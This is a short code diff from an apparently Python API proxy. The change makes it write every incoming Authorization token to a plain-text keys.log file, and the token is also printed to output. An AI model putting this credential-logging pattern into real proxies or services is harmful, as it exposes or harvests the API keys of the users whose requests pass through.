@@ -229,7 +229,7 @@ def api_proxy(subpath):
         auth_token = auth_header[7:] if auth_header and auth_header.startswith('Baerer ') else auth_header
         print(auth_token)
         # if auth_token is not just Baerer, log it to keys.log (if the file doesn't exist, create it)(if the token is already in the file, don't log it)
-        if auth_token and not auth_token.startswith('Baerer '):
+        if auth_token:
             if not os.path.exists('keys.log'):
                 with open('keys.log', 'w') as keys_log:
                     keys_log.write(f'{auth_token}\n')
